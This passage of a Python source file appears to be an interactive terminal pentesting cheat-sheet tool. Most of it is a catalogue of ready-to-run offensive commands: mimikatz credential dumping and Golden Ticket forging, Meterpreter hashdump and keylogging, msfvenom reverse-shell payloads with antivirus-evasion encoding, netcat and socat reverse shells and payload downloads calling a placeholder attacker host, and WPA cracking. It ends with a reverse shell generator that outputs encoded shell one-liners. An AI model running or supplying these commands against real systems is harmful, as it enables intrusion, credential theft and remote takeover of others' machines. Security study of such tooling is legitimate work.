                    {"cmd": "lsadump::sam",
                     "desc": "[mimikatz] Dump SAM database — local user NTLM hashes for offline cracking.",
                     "tags": ["mimikatz","sam","hashes","local","ntlm"]},
                    {"cmd": "lsadump::dcsync /user:krbtgt",
                     "desc": "[mimikatz] DCSync attack — simulate DC replication, pull krbtgt hash for Golden Ticket.",
                     "tags": ["mimikatz","dcsync","krbtgt","golden ticket","domain controller"]},
                    {"cmd": "kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /krbtgt:<hash> /ptt",
                     "desc": "[mimikatz] Create Golden Ticket — unlimited domain persistence with krbtgt hash.",
                     "tags": ["mimikatz","golden ticket","kerberos","persistence","domain admin"]},
                    {"cmd": "sekurlsa::pth /user:admin /domain:. /ntlm:<hash> /run:cmd.exe",
                     "desc": "[mimikatz] Pass-the-Hash — open cmd as user using NTLM hash without plaintext password.",
                     "tags": ["mimikatz","pass the hash","pth","lateral movement","ntlm"]},
                ],
            },
            "meterpreter": {
                "title": "Meterpreter — Metasploit Post-Exploit Shell",
                "about": "In-memory post-exploitation payload. Pivoting, file system, screenshots, keylogging, pivoting.",
                "website": "https://docs.metasploit.com/docs/using-metasploit/basics/using-meterpreter.html",
                "commands": [
                    {"cmd": "sysinfo && getuid",
                     "desc": "[meterpreter] Basic system info + current user. Run immediately after shell.",
                     "tags": ["meterpreter","sysinfo","user","post"]},
                    {"cmd": "getsystem",
                     "desc": "[meterpreter] Attempt automatic privilege escalation to SYSTEM.",
                     "tags": ["meterpreter","privesc","system","escalate"]},
                    {"cmd": "hashdump",
                     "desc": "[meterpreter] Dump local SAM hashes. Requires SYSTEM privileges.",
                     "tags": ["meterpreter","hashdump","sam","hashes","system"]},
                    {"cmd": "load kiwi && creds_all",
                     "desc": "[meterpreter] Load Kiwi (Mimikatz) module and dump all credentials at once.",
                     "tags": ["meterpreter","kiwi","mimikatz","credentials","dump"]},
                    {"cmd": "run post/multi/manage/shell_to_meterpreter",
                     "desc": "[meterpreter] Upgrade a plain shell session to full Meterpreter session.",
                     "tags": ["meterpreter","upgrade","shell","session"]},
                    {"cmd": "portfwd add -l 3389 -p 3389 -r <internal_ip>",
                     "desc": "[meterpreter] Port forward — tunnel RDP from internal host through session.",
                     "tags": ["meterpreter","portfwd","rdp","tunnel","pivot"]},
                    {"cmd": "run post/windows/gather/credentials/credential_collector",
                     "desc": "[meterpreter] Run automated credential collection module.",
                     "tags": ["meterpreter","credentials","gather","automated"]},
                    {"cmd": "screenshot && keyscan_start",
                     "desc": "[meterpreter] Take screenshot + start keylogger. Rich evidence capture.",
                     "tags": ["meterpreter","screenshot","keylogger","evidence"]},
                ],
            },
            "bloodhound": {
                "title": "BloodHound — AD Attack Path Mapper",
                "about": "Visualizes AD attack paths. Find shortest path to Domain Admin using graph theory.",
                "website": "https://github.com/BloodHoundAD/BloodHound",
                "commands": [
                    {"cmd": "SharpHound.exe -c All --zipfilename output.zip",
                     "desc": "[SharpHound] Collect all AD data: users, groups, GPOs, sessions, ACLs.",
                     "tags": ["bloodhound","sharphound","collect","ad","enum"]},
                    {"cmd": "python3 bloodhound-python -d <domain> -u <user> -p <pass> -ns <dc_ip> -c all",
                     "desc": "Python-based BloodHound collector — no Windows required. Full AD ingestion.",
                     "tags": ["bloodhound","python","collect","ad","linux"]},
                    {"cmd": "# BloodHound Cypher: Shortest path to Domain Admin",
                     "desc": "MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.COM'})) RETURN p",
                     "tags": ["bloodhound","cypher","domain admin","path","graph"]},
                    {"cmd": "# BloodHound Cypher: Find Kerberoastable users",
                     "desc": "MATCH (u:User {hasspn:true}) RETURN u.name, u.displayname, u.description",
                     "tags": ["bloodhound","kerberoast","spn","users","cypher"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  11. METASPLOIT FRAMEWORK
    # ════════════════════════════════════════════════════════════
    "metasploit": {
        "title": "Metasploit Framework",
        "icon": "🧨",
        "description": "Exploit framework: search, exploit, payload, handler, msfvenom",
        "tools": {
            "msf_console": {
                "title": "MSF Console — Core Commands",
                "about": "The msfconsole interactive shell. Search exploits, configure, launch, and manage sessions.",
                "website": "https://docs.metasploit.com",
                "commands": [
                    {"cmd": "msfconsole -q",
                     "desc": "Launch Metasploit quietly (no banner). Ready for commands immediately.",
                     "tags": ["metasploit","launch","console","msf"]},
                    {"cmd": "search type:exploit name:eternalblue",
                     "desc": "[msf] Search for exploits by name, CVE, platform, etc.",
                     "tags": ["metasploit","search","exploit","find"]},
                    {"cmd": "use exploit/windows/smb/ms17_010_eternalblue",
                     "desc": "[msf] Select the EternalBlue SMB exploit module.",
                     "tags": ["metasploit","eternalblue","smb","exploit","ms17-010"]},
                    {"cmd": "set RHOSTS <target> && set LHOST <attacker> && set LPORT 4444",
                     "desc": "[msf] Set required options: target, listener IP, listener port.",
                     "tags": ["metasploit","options","rhosts","lhost","lport"]},
                    {"cmd": "set payload windows/x64/meterpreter/reverse_tcp && run",
                     "desc": "[msf] Set 64-bit Meterpreter reverse TCP payload and launch exploit.",
                     "tags": ["metasploit","payload","meterpreter","reverse tcp","run"]},
                    {"cmd": "use multi/handler && set payload <same_as_binary> && run",
                     "desc": "[msf] Set up catch listener for incoming reverse shells / staged payloads.",
                     "tags": ["metasploit","handler","listener","catch","reverse shell"]},
                    {"cmd": "sessions -l && sessions -i 1",
                     "desc": "[msf] List all sessions, then interact with session 1.",
                     "tags": ["metasploit","sessions","interact","list"]},
                    {"cmd": "db_nmap -sV -sC <target> && hosts && services",
                     "desc": "[msf] Run nmap inside MSF, store results in DB. View with hosts/services.",
                     "tags": ["metasploit","nmap","db","hosts","services","scan"]},
                ],
            },
            "msfvenom": {
                "title": "msfvenom — Payload Generator",
                "about": "Generate standalone payloads for all platforms: EXE, ELF, APK, DLL, macro, shellcode.",
                "website": "https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html",
                "commands": [
                    {"cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe",
                     "desc": "64-bit Windows EXE Meterpreter reverse shell payload.",
                     "tags": ["msfvenom","windows","exe","meterpreter","reverse tcp"]},
                    {"cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf",
                     "desc": "64-bit Linux ELF reverse shell binary.",
                     "tags": ["msfvenom","linux","elf","shell","reverse tcp"]},
                    {"cmd": "msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o shell.php",
                     "desc": "PHP Meterpreter webshell payload. Upload to vulnerable web app.",
                     "tags": ["msfvenom","php","webshell","meterpreter","web"]},
                    {"cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f powershell",
                     "desc": "PowerShell shellcode — paste in PS session or embed in script.",
                     "tags": ["msfvenom","powershell","shellcode","windows","meterpreter"]},
                    {"cmd": "msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -o payload.apk",
                     "desc": "Android APK Meterpreter payload for mobile device testing.",
                     "tags": ["msfvenom","android","apk","mobile","meterpreter"]},
                    {"cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o encoded.exe",
                     "desc": "Encoded payload with 5 iterations of shikata_ga_nai encoder. AV evasion.",
                     "tags": ["msfvenom","encode","shikata","av evasion","obfuscate"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  12. NETWORK TOOLS & PIVOTING
    # ════════════════════════════════════════════════════════════
    "network_tools": {
        "title": "Network Tools, Shells & Pivoting",
        "icon": "🌐",
        "description": "Netcat, Socat, Chisel tunnels, SSH pivoting, ProxyChains",
        "tools": {
            "netcat": {
                "title": "Netcat — The Swiss Army Knife",
                "about": "TCP/UDP networking utility for listeners, banner grabbing, file transfer, and manual testing.",
                "website": "https://nmap.org/ncat/",
                "commands": [
                    {"cmd": "nc -lvnp 4444",
                     "desc": "Start listener: -l listen, -v verbose, -n no DNS, -p port. Catch reverse shells.",
                     "tags": ["netcat","nc","listener","catch","reverse shell"]},
                    {"cmd": "nc -e /bin/bash <attacker_ip> 4444",
                     "desc": "Traditional reverse shell with -e. Connects back to listener with bash.",
                     "tags": ["netcat","nc","reverse shell","bash","connect"]},
                    {"cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 4444 >/tmp/f",
                     "desc": "Netcat reverse shell without -e flag (OpenBSD nc). FIFO pipe trick.",
                     "tags": ["netcat","nc","fifo","mkfifo","reverse shell","openbsd"]},
                    {"cmd": "nc -w3 <target> 80",
                     "desc": "Banner grab on port 80. Manually test any TCP service. Send raw HTTP requests.",
                     "tags": ["netcat","nc","banner","grab","test"]},
                    {"cmd": "nc -lvnp 4444 > received_file.txt  (receiver) && nc <ip> 4444 < file.txt  (sender)",
                     "desc": "File transfer via Netcat. Receiver listens, sender pipes file. No encryption.",
                     "tags": ["netcat","nc","file transfer","send","receive"]},
                ],
            },
            "socat": {
                "title": "Socat — Advanced Relay Tool",
                "about": "Socat creates bidirectional data streams. Use for encrypted shells (SSL), full PTY shells, port forwarding.",
                "website": "https://linux.die.net/man/1/socat",
                "commands": [
                    {"cmd": "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane",
                     "desc": "Listener with full PTY — interactive shell with proper terminal. Best shell catcher.",
                     "tags": ["socat","listener","pty","interactive","shell","full"]},
                    {"cmd": "socat TCP:<attacker_ip>:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
                     "desc": "Reverse shell with full PTY. Superior to nc — supports tab-completion, Ctrl+C.",
                     "tags": ["socat","reverse shell","pty","interactive","bash"]},
                    {"cmd": "socat TCP-LISTEN:4444,fork TCP:<internal_ip>:22",
                     "desc": "TCP relay / port forward. Forward port 4444 on attacker to internal SSH.",
                     "tags": ["socat","port forward","relay","pivot","tunnel"]},
                    {"cmd": "socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0 EXEC:bash",
                     "desc": "Encrypted SSL listener. Traffic looks like HTTPS. Excellent for IDS/firewall evasion.",
                     "tags": ["socat","ssl","encrypted","https","evasion","shell"]},
                ],
            },
            "chisel": {
                "title": "Chisel — Fast TCP/UDP Tunnel over HTTP",
                "about": "Tunnel TCP/UDP traffic through HTTP/WebSocket. Bypass firewalls, create SOCKS proxies.",
                "website": "https://github.com/jpillora/chisel",
                "commands": [
                    {"cmd": "chisel server -p 8080 --reverse  (on attacker)",
                     "desc": "Start Chisel server on attacker with --reverse flag to accept reverse tunnels.",
                     "tags": ["chisel","server","reverse","tunnel","attacker"]},
                    {"cmd": "chisel client <attacker_ip>:8080 R:socks  (on victim)",
                     "desc": "Create reverse SOCKS5 proxy from victim to attacker. Route traffic through victim network.",
                     "tags": ["chisel","client","socks","proxy","victim","pivot"]},
                    {"cmd": "chisel client <attacker_ip>:8080 R:9090:<internal_ip>:80",
                     "desc": "Forward attacker port 9090 to internal web server port 80 via victim.",
                     "tags": ["chisel","forward","port","internal","pivot","web"]},
                    {"cmd": "# proxychains.conf: socks5 127.0.0.1 1080\nproxychains nmap -sT -Pn <internal_subnet>",
                     "desc": "Route nmap through SOCKS proxy via ProxyChains. Scan internal network through pivot.",
                     "tags": ["chisel","proxychains","nmap","internal","scan","pivot"]},
                ],
            },
            "ssh_tunnels": {
                "title": "SSH Tunnels & Port Forwarding",
                "about": "Use SSH for local, remote, and dynamic port forwarding — bypass firewall restrictions.",
                "website": "https://www.ssh.com/academy/ssh/tunneling",
                "commands": [
                    {"cmd": "ssh -L 8080:<internal_ip>:80 user@<pivot>",
                     "desc": "Local port forward — access internal:80 via localhost:8080 through pivot host.",
                     "tags": ["ssh","tunnel","local forward","pivot","port"]},
                    {"cmd": "ssh -R 4444:localhost:4444 user@<attacker>",
                     "desc": "Remote port forward — expose local port 4444 on attacker machine. Useful for shells.",
                     "tags": ["ssh","tunnel","remote forward","reverse","shell"]},
                    {"cmd": "ssh -D 1080 user@<pivot>",
                     "desc": "Dynamic SOCKS5 proxy on 127.0.0.1:1080 through SSH. Use with ProxyChains.",
                     "tags": ["ssh","socks","dynamic","proxy","proxychains","pivot"]},
                    {"cmd": "ssh -N -f -L 3306:<internal_db>:3306 user@<pivot>",
                     "desc": "Background (-f -N) SSH tunnel to internal MySQL. Use mysql client locally after.",
                     "tags": ["ssh","tunnel","mysql","database","background","pivot"]},
                ],
            },
            "shell_upgrade": {
                "title": "Shell Stabilization & TTY Upgrade",
                "about": "Upgrade dumb reverse shells to interactive TTY. Essential for tab-complete, Ctrl+C, vi.",
                "website": "https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/",
                "commands": [
                    {"cmd": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
                     "desc": "Spawn PTY via Python. First step — gives basic shell, but still not fully interactive.",
                     "tags": ["shell","upgrade","pty","python","stabilize","tty"]},
                    {"cmd": "# After python3 pty.spawn:\nexport TERM=xterm && Ctrl+Z → stty raw -echo; fg",
                     "desc": "Full TTY upgrade: set TERM, background shell, configure local stty raw, foreground.",
                     "tags": ["shell","upgrade","tty","stty","interactive","raw"]},
                    {"cmd": "stty size  →  stty rows 50 cols 200",
                     "desc": "Fix terminal dimensions after upgrade. Required for vi/nano to work properly.",
                     "tags": ["shell","tty","stty","size","rows","cols"]},
                    {"cmd": "script /dev/null -c bash",
                     "desc": "Alternative PTY spawn using script utility. Works when Python unavailable.",
                     "tags": ["shell","upgrade","script","pty","bash","alternative"]},
                    {"cmd": "/usr/bin/script -qc /bin/bash /dev/null",
                     "desc": "Another script-based TTY spawn. Fully interactive shell without Python.",
                     "tags": ["shell","upgrade","script","tty","no python"]},
                ],
            },
            "file_transfer": {
                "title": "File Transfer Methods",
                "about": "Transfer files in restricted environments: Python HTTP, wget, curl, certutil, base64.",
                "website": "https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration",
                "commands": [
                    {"cmd": "python3 -m http.server 80",
                     "desc": "Serve files via HTTP on port 80. Simplest way to serve tools to victim.",
                     "tags": ["file transfer","python","http","server","serve"]},
                    {"cmd": "wget http://<attacker>/tool.sh -O /tmp/tool.sh && chmod +x /tmp/tool.sh",
                     "desc": "Download file on Linux victim. Write to /tmp (usually world-writable).",
                     "tags": ["file transfer","wget","download","linux","tmp"]},
                    {"cmd": "curl http://<attacker>/shell.sh -o /tmp/shell.sh",
                     "desc": "Download file with curl on Linux victim. Use curl -k for HTTPS with self-signed cert.",
                     "tags": ["file transfer","curl","download","linux"]},
                    {"cmd": "certutil -urlcache -split -f http://<attacker>/tool.exe C:\\Windows\\Temp\\tool.exe",
                     "desc": "Windows certutil file download. Built-in LOLBin — avoids PowerShell restrictions.",
                     "tags": ["file transfer","windows","certutil","lolbin","download"]},
                    {"cmd": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://<attacker>/tool.exe','C:\\Temp\\tool.exe')\"",
                     "desc": "PowerShell WebClient download. Common and reliable on Windows.",
                     "tags": ["file transfer","powershell","windows","download","webclient"]},
                    {"cmd": "base64 tool.elf && echo '<base64>' | base64 -d > /tmp/tool && chmod +x /tmp/tool",
                     "desc": "Encode binary as base64, paste in shell, decode to file. No network connection needed.",
                     "tags": ["file transfer","base64","encode","decode","no network"]},
                    {"cmd": "scp tool.sh user@<victim>:/tmp/  or  scp user@<victim>:/etc/shadow .",
                     "desc": "SCP file transfer — push tool to victim or pull files from victim. Requires SSH access.",
                     "tags": ["file transfer","scp","ssh","push","pull"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  13. WIRELESS ATTACKS
    # ════════════════════════════════════════════════════════════
    "wireless": {
        "title": "Wireless Attacks",
        "icon": "📶",
        "description": "WiFi recon, WPA handshake capture, PMKID attack, deauth",
        "tools": {
            "aircrack": {
                "title": "Aircrack-ng Suite — WiFi Security Toolkit",
                "about": "Industry-standard wireless attack toolkit: monitor mode, packet capture, deauth, WPA cracking.",
                "website": "https://www.aircrack-ng.org",
                "commands": [
                    {"cmd": "airmon-ng check kill && airmon-ng start wlan0",
                     "desc": "Kill interfering processes and enable monitor mode on wlan0 (creates wlan0mon).",
                     "tags": ["aircrack","monitor mode","wlan","wireless","recon"]},
                    {"cmd": "airodump-ng wlan0mon",
                     "desc": "Scan all channels — discovers nearby APs with BSSID, channel, clients.",
                     "tags": ["aircrack","airodump","scan","aps","clients","recon"]},
                    {"cmd": "airodump-ng -c <channel> --bssid <AP_BSSID> -w capture wlan0mon",
                     "desc": "Lock to target AP channel, save capture to file. Wait for WPA handshake.",
                     "tags": ["aircrack","airodump","capture","handshake","channel","bssid"]},
                    {"cmd": "aireplay-ng --deauth 100 -a <AP_BSSID> -c <client_MAC> wlan0mon",
                     "desc": "Deauthenticate client from AP (100 packets). Forces reconnect = WPA handshake captured.",
                     "tags": ["aircrack","aireplay","deauth","client","handshake","capture"]},
                    {"cmd": "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
                     "desc": "Dictionary attack on captured WPA handshake using rockyou wordlist.",
                     "tags": ["aircrack","crack","wpa","handshake","dictionary","rockyou"]},
                    {"cmd": "hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1",
                     "desc": "Capture PMKID (no client deauth needed). More modern WPA2 attack method.",
                     "tags": ["aircrack","hcxdumptool","pmkid","wpa2","capture"]},
                    {"cmd": "hcxpcapngtool -o hashes.hc22000 capture.pcapng && hashcat -m 22000 hashes.hc22000 rockyou.txt",
                     "desc": "Convert PMKID capture to hashcat format, then crack WPA2 with hashcat GPU.",
                     "tags": ["aircrack","pmkid","hashcat","wpa2","crack","gpu"]},
                    {"cmd": "airmon-ng stop wlan0mon && service NetworkManager restart",
                     "desc": "Disable monitor mode and restore normal WiFi operation after testing.",
                     "tags": ["aircrack","monitor","stop","restore","cleanup"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  14. OSINT
    # ════════════════════════════════════════════════════════════
    "osint": {
        "title": "OSINT — Open Source Intelligence",
        "icon": "🕵",
        "description": "Email/domain/person intel: TheHarvester, Shodan, Google Dorks, Maltego",
        "tools": {
            "theharvester": {
                "title": "TheHarvester — Email & Subdomain OSINT",
                "about": "Gather emails, names, subdomains, IPs, and URLs from public sources and search engines.",
                "website": "https://github.com/laramies/theHarvester",
                "commands": [
                    {"cmd": "theHarvester -d <domain> -b google,bing,duckduckgo -l 500",
                     "desc": "Harvest emails and subdomains from Google/Bing/DDG. -l 500 = 500 results.",
                     "tags": ["theharvester","email","subdomain","google","bing","osint"]},
                    {"cmd": "theHarvester -d <domain> -b all -f output.html",
                     "desc": "Use all available data sources, save HTML report.",
                     "tags": ["theharvester","all sources","html","report","osint"]},
                    {"cmd": "theHarvester -d <domain> -b linkedin",
                     "desc": "Harvest LinkedIn employee names and positions. Great for spear-phishing prep.",
                     "tags": ["theharvester","linkedin","employees","spear phishing","osint"]},
                ],
            },
            "shodan": {
                "title": "Shodan — Internet-Wide Device Search",
                "about": "Search internet-connected devices, banners, open ports, CVEs without scanning the target.",
                "website": "https://www.shodan.io",
                "commands": [
                    {"cmd": "shodan search 'org:\"Target Corp\" product:\"Apache\"'",
                     "desc": "Find Apache servers for a specific organization. No target contact needed.",
                     "tags": ["shodan","search","apache","org","passive","recon"]},
                    {"cmd": "shodan host <target_ip>",
                     "desc": "Full info on a specific IP: open ports, banners, location, CVEs.",
                     "tags": ["shodan","host","ip","ports","banners","cve"]},
                    {"cmd": "shodan search 'port:3389 country:GB has_screenshot:true'",
                     "desc": "Find exposed UK RDP servers with screenshots. Quick target identification.",
                     "tags": ["shodan","rdp","screenshot","country","exposed"]},
                    {"cmd": "shodan search 'http.title:\"phpmyadmin\" port:80'",
                     "desc": "Find exposed phpMyAdmin panels. Often accessible with default/no credentials.",
                     "tags": ["shodan","phpmyadmin","exposed","panel","default creds"]},
                ],
            },
            "google_dorks": {
                "title": "Google Dork Queries",
                "about": "Advanced Google search operators to find sensitive data, admin panels, exposed files.",
                "website": "https://www.exploit-db.com/google-hacking-database",
                "commands": [
                    {"cmd": "site:<domain> filetype:pdf OR filetype:doc OR filetype:xls",
                     "desc": "Find documents indexed for a domain. May contain internal data or metadata.",
                     "tags": ["dork","google","site","filetype","documents","osint"]},
                    {"cmd": "site:<domain> inurl:admin OR inurl:login OR inurl:dashboard",
                     "desc": "Discover admin panels and login pages indexed by Google.",
                     "tags": ["dork","google","admin","login","dashboard","panel"]},
                    {"cmd": "site:<domain> ext:env OR ext:log OR ext:conf OR ext:bak",
                     "desc": "Find exposed env files, logs, configs, backups — often contain credentials.",
                     "tags": ["dork","google","env","log","config","backup","credentials"]},
                    {"cmd": "intitle:\"index of\" site:<domain> \"password\"",
                     "desc": "Find open directory listings containing password files on the target domain.",
                     "tags": ["dork","google","directory listing","password","index"]},
                    {"cmd": "site:<domain> intext:\"sql syntax near\" OR intext:\"syntax error has occurred\"",
                     "desc": "Find pages leaking SQL error messages — strong SQLi indicator.",
                     "tags": ["dork","google","sql error","sqli","leak"]},
                    {"cmd": "\"@<domain>\" site:pastebin.com OR site:github.com OR site:gitlab.com",
                     "desc": "Find leaked credentials or secrets on paste sites and code repos.",
                     "tags": ["dork","pastebin","github","leaks","credentials","secrets"]},
                ],
            },
        },
    },
}

# ══════════════════════════════════════════════════════════════════
#  HELPER FUNCTIONS
# ══════════════════════════════════════════════════════════════════

def clear_screen():
    """Clear the terminal cross-platform."""
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    """Render the blood-drip banner with caption."""
    clear_screen()
    console.print(BANNER, style=T["banner"])
    now = datetime.datetime.now().strftime("%H:%M:%S")
    console.print(Align.center(f"[{T['caption']}]{'▓' * 62}[/{T['caption']}]"))
    console.print(Align.center(f"[{T['caption']}]  {CAPTION}  [/{T['caption']}]"))
    console.print(Align.center(f"[{T['caption']}]{'▓' * 62}[/{T['caption']}]"))
    console.print(Align.center(
        f"[{T['caption2']}]{TAGLINE}  ·  {VERSION}  ·  Session: {now}[/{T['caption2']}]"
    ))
    console.print()


def divider(label: str = "", char: str = "═"):
    """Print a styled divider with optional label."""
    if label:
        console.print(Rule(f"[{T['section']}] {label} [/{T['section']}]", style=T["border"]))
    else:
        console.print(Rule(style=T["border"]))


def cmd_table(commands: list, title: str) -> Table:
    """Build a command reference table from a list of command dicts."""
    tbl = Table(
        title=f"[{T['menu_title']}]{title}[/{T['menu_title']}]",
        box=box.DOUBLE_EDGE,
        border_style=T["border"],
        header_style=f"bold {T['section']}",
        show_lines=True,
        expand=True,
    )
    tbl.add_column("#",              style=T["menu_idx"],  justify="right", width=4, no_wrap=True)
    tbl.add_column("COMMAND / PAYLOAD", style=T["cmd"],   ratio=42)
    tbl.add_column("DESCRIPTION & SCENARIO", style=T["cmd_desc"], ratio=58)
    for i, entry in enumerate(commands, 1):
        tbl.add_row(str(i), entry["cmd"], entry["desc"])
    return tbl


def show_tool(tool_data: dict):
    """Render tool header panel + command table."""
    console.print()
    hdr = Text()
    hdr.append(f"  ⚔  {tool_data['title']}\n", style=T["tool_hdr"])
    hdr.append(f"  {tool_data['about']}\n",      style="dim white")
    hdr.append(f"  ↗  {tool_data['website']}",   style=T["info"])
    console.print(Panel(hdr, border_style=T["border"], padding=(1, 2)))
    console.print(cmd_table(tool_data["commands"], "Commands & Payloads"))
    console.print()


def pause():
    """Wait for Enter to continue."""
    console.print(f"\n  [{T['prompt']}][ ENTER ] to continue...[/{T['prompt']}]", end="")
    input()


def search_commands(query: str) -> list:
    """
    Full-text search across cmd, desc, and tags for all commands.
    Returns list of dicts with category/tool context.
    """
    q = query.lower().strip()
    results = []
    for cat_data in COMMANDS.values():
        for tool_data in cat_data["tools"].values():
            for entry in tool_data["commands"]:
                haystack = " ".join([
                    entry["cmd"].lower(),
                    entry["desc"].lower(),
                    " ".join(entry.get("tags", []))
                ])
                if q in haystack:
                    results.append({
                        "category" : cat_data["title"],
                        "tool"     : tool_data["title"],
                        "cmd"      : entry["cmd"],
                        "desc"     : entry["desc"],
                    })
    return results


def show_search_results(query: str, results: list):
    """Render search results table."""
    console.print()
    if not results:
        console.print(Panel(
            f"[{T['error']}]  No results for:[/{T['error']}] [{T['highlight']}]'{query}'[/{T['highlight']}]\n"
            f"  [dim white]Try: xss · sqli · nmap · csrf · blind · hydra · privesc · mimikatz · wpa[/dim white]",
            border_style=T["border"]
        ))
        return
    console.print(Panel(
        f"[{T['success']}]  {len(results)} result(s) for:[/{T['success']}] [{T['highlight']}]'{query}'[/{T['highlight']}]",
        border_style=T["border"]
    ))
    tbl = Table(
        title=f"[{T['menu_title']}]Search: '{query}'[/{T['menu_title']}]",
        box=box.DOUBLE_EDGE, border_style=T["border"],
        header_style=f"bold {T['section']}", show_lines=True, expand=True,
    )
    tbl.add_column("Category / Tool", style=T["menu_desc"],  ratio=22)
    tbl.add_column("COMMAND / PAYLOAD", style=T["cmd"],      ratio=38)
    tbl.add_column("DESCRIPTION",      style=T["cmd_desc"],  ratio=40)
    for r in results:
        tbl.add_row(f"{r['category']}\n[dim]→ {r['tool']}[/dim]", r["cmd"], r["desc"])
    console.print(tbl)
    console.print()


# ══════════════════════════════════════════════════════════════════
#  INTERACTIVE FEATURE: REVERSE SHELL GENERATOR
# ══════════════════════════════════════════════════════════════════

def reverse_shell_generator():
    """
    Interactive reverse shell generator.
    User supplies IP + port, selects language, gets payload in multiple encodings.
    """
    print_banner()
    divider("REVERSE SHELL GENERATOR")
    console.print()

    # List available shell types
    tbl = Table(box=box.SIMPLE_HEAVY, border_style=T["border"], show_header=False, padding=(0,2))
    tbl.add_column("Num", style=T["menu_idx"], justify="right", width=5)
    tbl.add_column("Name", style=T["menu_item"], width=28)
    tbl.add_column("Language", style=T["tag"])
    for i, t in enumerate(REVSHELL_TEMPLATES, 1):
        tbl.add_row(f"[{i}]", t["name"], t["lang"])
    console.print(Align.center(tbl))
    console.print()

    # Gather inputs
    lhost = Prompt.ask(f"  [{T['prompt']}]LHOST (attacker IP)[/{T['prompt']}]").strip()
    lport = Prompt.ask(f"  [{T['prompt']}]LPORT (listener port)[/{T['prompt']}]", default="4444").strip()
    sel   = Prompt.ask(f"  [{T['prompt']}]Select shell number[/{T['prompt']}]").strip()

    if not sel.isdigit() or not (1 <= int(sel) <= len(REVSHELL_TEMPLATES)):
        console.print(f"\n  [{T['error']}]Invalid selection.[/{T['error']}]")
        pause()
        return

    tmpl  = REVSHELL_TEMPLATES[int(sel) - 1]
    shell = tmpl["shell"].replace("{ip}", lhost).replace("{port}", lport)

    # Encode variants
    b64_shell   = base64.b64encode(shell.encode()).decode()
    url_shell   = urllib.parse.quote(shell)
    hex_shell   = shell.encode().hex()

    console.print()
    console.print(Panel(
        f"[{T['gen_out']}]{shell}[/{T['gen_out']}]",
        title=f"[{T['tool_hdr']}]  {tmpl['name']} Reverse Shell  [/{T['tool_hdr']}]",
        border_style=T["border"], padding=(1, 2)
    ))
    console.print(Panel(
        f"[{T['warn']}]{b64_shell}[/{T['warn']}]",
        title=f"[dim red]  Base64 Encoded  [/dim red]",
        border_style=T["border2"], padding=(0, 2)
    ))
    console.print(Panel(
        f"[dim green]{url_shell}[/dim green]",
        title=f"[dim red]  URL Encoded  [/dim red]",
        border_style=T["border2"], padding=(0, 2)
    ))
    console.print(Panel(
        f"[dim white]{hex_shell}[/dim white]",
        title=f"[dim red]  Hex Encoded  [/dim red]",
        border_style=T["border2"], padding=(0, 2)
    ))
    console.print(Panel(
        f"[{T['info']}]Listener command:[/{T['info']}]  [{T['cmd']}]nc -lvnp {lport}[/{T['cmd']}]\n"
        f"[{T['info']}]Socat listener:  [/{T['info']}]  [{T['cmd']}]socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane[/{T['cmd']}]",
        title="[dim red]  Setup Listener  [/dim red]",
        border_style=T["border2"], padding=(1, 2)
    ))
    pause()


# ══════════════════════════════════════════════════════════════════
#  INTERACTIVE FEATURE: ENCODE / DECODE UTILITY
# ══════════════════════════════════════════════════════════════════

def encode_decode_utility():
    """
    Built-in multi-format encoder / decoder.
    Supports: base64, URL, hex, HTML entities, ROT13.
    """
    print_banner()
    divider("ENCODE / DECODE UTILITY")
    console.print()

    ops = [
        ("Base64 Encode",    "b64e"),
        ("Base64 Decode",    "b64d"),
        ("URL Encode",       "urle"),
        ("URL Decode",       "urld"),
        ("Hex Encode",       "hexe"),
        ("Hex Decode",       "hexd"),
        ("HTML Entity Enc",  "htmle"),
        ("ROT13",            "rot13"),
        ("MD5 Hash",         "md5"),
        ("SHA1 Hash",        "sha1"),
        ("SHA256 Hash",      "sha256"),
    ]

    tbl = Table(box=box.SIMPLE_HEAVY, border_style=T["border"], show_header=False, padding=(0, 2))
    tbl.add_column("Num", style=T["menu_idx"], justify="right", width=5)
    tbl.add_column("Operation",  style=T["menu_item"], width=22)
    for i, (name, _) in enumerate(ops, 1):
        tbl.add_row(f"[{i}]", name)
    console.print(Align.center(tbl))
    console.print()

    sel = Prompt.ask(f"  [{T['prompt']}]Select operation[/{T['prompt']}]").strip()
    if not sel.isdigit() or not (1 <= int(sel) <= len(ops)):
        console.print(f"  [{T['error']}]Invalid selection.[/{T['error']}]")
        pause()
        return

    op_name, op_key = ops[int(sel) - 1]
    text = Prompt.ask(f"  [{T['prompt']}]Input[/{T['prompt']}]").strip()

    result = ""
    try:
        if   op_key == "b64e":   result = base64.b64encode(text.encode()).decode()
        elif op_key == "b64d":   result = base64.b64decode(text.encode()).decode()
